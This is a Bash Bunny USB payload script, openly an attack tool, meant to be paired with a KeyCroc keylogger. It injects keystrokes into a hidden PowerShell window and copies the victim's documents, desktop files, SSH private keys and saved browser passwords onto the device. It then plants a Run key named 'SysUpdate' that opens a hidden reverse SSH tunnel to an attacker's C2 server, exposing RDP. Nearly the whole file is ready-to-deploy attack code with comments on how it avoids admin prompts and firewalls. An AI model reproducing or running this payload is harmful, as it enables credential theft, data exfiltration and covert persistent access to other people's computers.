#!/bin/bash
#
# Bash Bunny Payload — Dual-Implant Partner to KeyCroc
# =====================================================
# Role split:
#   KeyCroc   (inline keyboard interceptor) → captures PLAINTEXT Windows password
#   Bash Bunny (second USB port)            → physically exfiltrates files to its
#                                             own mass storage + installs reverse
#                                             SSH tunnel persistence (no admin needed)
#
# Why Bash Bunny for file exfil and not KeyCroc?
#   The KeyCroc has no mass storage mode — it cannot appear as a USB drive.
#   The Bash Bunny emulates HID + STORAGE simultaneously: it injects keystrokes
#   that make PowerShell copy files directly onto the Bunny's own udisk partition.
#   No network, no C2, no internet required — a firewall cannot stop this.
#
# Why reverse SSH instead of OpenSSH server install?
#   Installing OpenSSH Server (Add-WindowsCapability) requires admin elevation.
#   The OpenSSH CLIENT is installed by default on Windows 10 1809+ for all users.
#   A reverse tunnel originates outbound from the target — no firewall rule needed,
#   no new service, no UAC prompt. Runs entirely in user context.
#
# Attack flow:
#   1. Bunny appears as USB keyboard + USB flash drive
#   2. HID injection opens hidden PowerShell, copies target files to the Bunny
#   3. HID injection writes a HKCU Run key that establishes a reverse SSH tunnel
#      back to C2 on every logon — persistent, no admin required
#   4. Attacker connects to C2 and forwards the tunnel to access target's RDP/SMB
#
# Pre-deployment:
#   - Set C2_IP and C2_SSH_USER below
#   - Add your C2's SSH public key to /root/udisk/authorized_keys on the Bunny
#     (used by the reverse tunnel target-side; it references your C2's host key)
#   - The Bunny's udisk partition mounts as D:\ (or E:\) on the target Windows PC

C2_IP="C2_SERVER_IP"       # Your C2 server's IP or hostname
C2_SSH_USER="tunnel"       # Unprivileged user on C2 that accepts reverse tunnels
C2_SSH_PORT="22"           # SSH port on C2
REVERSE_PORT="2222"        # Port on C2 that will forward to target's RDP (3389)
LOOT_DIR="/root/loot/bunny"

# ─── Phase 1: Attack Mode ────────────────────────────────────────────────────
# HID: appear as a USB keyboard for keystroke injection
# STORAGE: appear as a USB flash drive — target sees it as D:\ or E:\
LED SETUP
ATTACKMODE HID STORAGE
sleep 4  # wait for Windows to mount the storage drive and assign a letter

mkdir -p "${LOOT_DIR}"

# Detect the drive letter Windows assigned to the Bunny's udisk partition.
# We inject a small PowerShell snippet that writes the letter to a file
# on the Bunny itself, then read it back.
Q GUI r
Q DELAY 600
Q STRING "powershell -W Hidden -Exec Bypass"
Q ENTER
Q DELAY 1000

# Find our own drive letter by matching the Bunny's volume label "BashBunny"
Q STRING "\$bl=(Get-Volume -FileSystemLabel 'BashBunny' -EA SilentlyContinue).DriveLetter; if(\$bl){\$bl | Out-File \"\${bl}:\\bunny_letter.txt\" -NoNewline}"
Q ENTER
Q DELAY 500

# Read the letter back (Bunny-side) — poll briefly
sleep 3
BUNNY_LETTER=""
for f in /root/udisk/bunny_letter.txt; do
    [ -f "$f" ] && BUNNY_LETTER=$(cat "$f") && rm -f "$f"
done
[ -z "${BUNNY_LETTER}" ] && BUNNY_LETTER="E"  # fallback if detection failed
echo "[*] Bunny drive letter: ${BUNNY_LETTER}:"

LED ATTACK

# ─── Phase 2: File Exfiltration to Bunny Storage ─────────────────────────────
# PowerShell copies high-value locations directly to the Bunny's udisk.
# No network required — files end up physically on the device.
# Targets: Documents, Desktop, SSH keys, browser profile dirs, recent files.
Q STRING "\$dst='${BUNNY_LETTER}:\\loot'; New-Item -ItemType Directory -Force \$dst | Out-Null"
Q ENTER

Q STRING "Copy-Item \"\$env:USERPROFILE\\Documents\" -Destination \"\$dst\\Documents\" -Recurse -Force -ErrorAction SilentlyContinue"
Q ENTER

Q STRING "Copy-Item \"\$env:USERPROFILE\\Desktop\" -Destination \"\$dst\\Desktop\" -Recurse -Force -ErrorAction SilentlyContinue"
Q ENTER

# SSH private keys — high value for lateral movement
Q STRING "Copy-Item \"\$env:USERPROFILE\\.ssh\" -Destination \"\$dst\\ssh_keys\" -Recurse -Force -ErrorAction SilentlyContinue"
Q ENTER

# Browser saved passwords (SQLite DBs — offline crackable)
Q STRING "Copy-Item \"\$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\" -Destination \"\$dst\\chrome_logins\" -Force -ErrorAction SilentlyContinue"
Q ENTER
Q STRING "Copy-Item \"\$env:APPDATA\\Mozilla\\Firefox\\Profiles\" -Destination \"\$dst\\firefox_profiles\" -Recurse -Force -ErrorAction SilentlyContinue"
Q ENTER

Q DELAY 8000  # allow large copies to finish

# ─── Phase 3: Reverse SSH Tunnel Persistence (no admin needed) ───────────────
# Writes a HKCU Run key so on every logon the target silently opens a reverse
# SSH tunnel to C2. The tunnel forwards C2:REVERSE_PORT → target:3389 (RDP).
# OpenSSH client (ssh.exe) ships with Windows 10 1809+ — no install needed.
#
# -N        : don't execute a remote command, just forward
# -R        : remote port forward (C2 listens, traffic goes to target localhost)
# -o ...    : suppress host key prompts and keep connection alive
# -i        : use a key pre-deployed to the target's .ssh folder
#
# We also write the C2 host key to known_hosts so ssh doesn't prompt.
Q STRING "\$sshDir=\"\$env:USERPROFILE\\.ssh\"; New-Item -Force -ItemType Directory \$sshDir | Out-Null"
Q ENTER

# Deploy C2's host key so SSH doesn't prompt on first connect
# (Replace C2_HOSTKEY_LINE with the actual line from your C2's /etc/ssh/ssh_host_ed25519_key.pub)
Q STRING "Add-Content \"\$sshDir\\known_hosts\" '${C2_IP} C2_HOSTKEY_LINE'"
Q ENTER

# Deploy a client key the tunnel will authenticate with
# (The matching private key must be pre-placed on Bunny udisk as tunnel_id)
Q STRING "Copy-Item '${BUNNY_LETTER}:\\tunnel_id' \"\$sshDir\\tunnel_id\" -Force -ErrorAction SilentlyContinue"
Q ENTER
Q STRING "icacls \"\$sshDir\\tunnel_id\" /inheritance:r /grant \"\${env:USERNAME}:R\""
Q ENTER

# Write the Run key — runs hidden on every user logon, no UAC
Q STRING "\$cmd='ssh.exe -N -o StrictHostKeyChecking=yes -o ServerAliveInterval=60 -o ExitOnForwardFailure=yes -i %USERPROFILE%\\.ssh\\tunnel_id -R ${REVERSE_PORT}:localhost:3389 ${C2_SSH_USER}@${C2_IP} -p ${C2_SSH_PORT}'"
Q ENTER
Q STRING "Set-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'SysUpdate' -Value \$cmd"
Q ENTER

# Start the tunnel immediately without waiting for reboot
Q STRING "Start-Process ssh.exe -ArgumentList '-N -o StrictHostKeyChecking=yes -o ServerAliveInterval=60 -i \$sshDir\\tunnel_id -R ${REVERSE_PORT}:localhost:3389 ${C2_SSH_USER}@${C2_IP} -p ${C2_SSH_PORT}' -WindowStyle Hidden"
Q ENTER
Q DELAY 2000

Q STRING "exit"
Q ENTER

# ─── Phase 4: Wait for file copy to complete, then finish ────────────────────
LED STAGE1
sleep 15  # buffer for slower file copies

# Move loot from udisk to permanent Bunny loot dir after extraction
# (udisk files move to internal storage so they survive if udisk is wiped)
TIMESTAMP=$(date +%s)
mkdir -p "${LOOT_DIR}/${TIMESTAMP}"
mv /root/udisk/loot/* "${LOOT_DIR}/${TIMESTAMP}/" 2>/dev/null
echo "[+] Loot moved to ${LOOT_DIR}/${TIMESTAMP}/"

# ─── Done ─────────────────────────────────────────────────────────────────────
# Attacker access after Bunny is removed:
#   ssh -p REVERSE_PORT localhost    ← on C2, to reach target's RDP via tunnel
#   Or use any RDP client pointed at C2:REVERSE_PORT
LED FINISH
